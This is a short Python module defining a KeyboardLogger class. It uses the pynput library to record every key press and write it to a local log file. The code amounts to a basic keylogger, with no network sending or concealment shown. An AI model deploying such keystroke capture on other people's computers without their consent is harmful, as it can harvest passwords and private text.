from pynput import keyboard
from input_logger import InputLogger

class KeyboardLogger(InputLogger):
    
    def __init__(self, time_interval):
        super().__init__(time_interval)
        self.log += "=====KeyboardLogger Started=====\n"

    def on_press(self, key):
        
        ###
        try:
            keyStr = str(key.char)
        except AttributeError:
            if key == key.space:
                keyStr = "SPACE"
            elif key == key.esc:
                keyStr = "ESC"
            else:
                keyStr = " " + str(key) + " "
        ###
        #log = str(keyStr) + " pressed" + "\n"
        log = str(keyStr) + " pressed"
        self.add_log(log)
    
    # Found that the input logger can distinguish uppercase and
    # lowercase inputs, the on_release monitor is no longer needed
    """
    def on_release(self, key):
        
        #keyStr = str(key.char)
        log = str(key) + " released"
        self.add_log(log)
    """
        
    def run(self):
        self.save_log('logfile//keyboard_log.txt')
        keyboard_listener = keyboard.Listener(
            on_press=self.on_press
            #,on_release=self.on_release
            )
        
        with keyboard_listener:
            keyboard_listener.join()